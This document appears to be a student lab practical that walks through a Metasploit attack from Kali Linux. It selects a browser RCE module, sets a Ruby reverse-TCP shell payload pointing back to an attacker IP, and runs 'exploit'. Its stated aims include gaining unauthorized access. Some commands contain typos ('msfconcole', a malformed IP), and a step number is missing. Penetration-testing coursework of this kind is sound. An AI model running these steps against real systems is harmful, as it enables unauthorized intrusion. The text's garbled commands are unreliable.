PRACTICAL NO 10
AIM : Exploiting with Metasploit (Kali Linux) 
•Identify a vulnerable system and exploit it using Metasploit modules. 
•Gain unauthorized access to the target system and execute commands or extract information. 
•Understand the ethical considerations and legal implications of using Metasploit for penetration testing.

SOLUTION:

Step 1 : Launch the Metasploit Framework in Kali Linux
Command:  msfconcole


Step 2 :  Type search tcp command to search for exploits, payloads, auxiliary modules, or other Metasploit components related to the TCP protocol.
Command: search tcp



Step 3 :  Loads the msfd_rce_browser exploit module in Metasploit, which targets remote code execution vulnerabilities in web browsers.
Command:  use exploit/multi/browser/msfd_rce_browser


Step 4 : Set the server port for the Metasploit exploit to 1244, which is the port that the listener will use to communicate with the target system.
Command:  set srvport 1244

Step 5 : Excute the show options command to check if the SRVPORT is set to 1244
Command:  show options


Step 6 :  Enable SSL (Secure Sockets Layer) for the encrypted communication between the Metasploit listener and the target system
Command:  set ssl true


Step 7 :  : Excute the show options command to check if the SSL is set to true
Command:  show options


Step 8 :  Check the list of available payloads in Metasploit that can be used with the selected exploit module.
Command:  show payloads


Step 9 :  Set the payload to ruby/shell_reverse_tcp, which creates a reverse TCP shell using Ruby to connect back to the attacker's machine.
Command:  > set payload ruby/shell_reverse_tcp 


Step 10 :  Check if the payload options is set to ruby/shell_reverse_tcp
Command:  show options


Step 11 : In the victim ‘s PC go to the command prompt and type ipconfig and note down the Ethernet Adapter Ethernet’s IPv4 Address
Command: ipconfig


Step 12 :  Set the local host (LHOST) IP address to 192.168.90.123, which is the attacker's machine IP address
Command: set lhost 192.168.90123


Step 13 :  Chcek if the LHOST IP address is set to 192.168.90.123
Command: show options


Step 15 : Type the exploit command to launch the attack, triggering the selected exploit to run and attempt to exploit the target system using the configured payload and settings.
Command: exploit
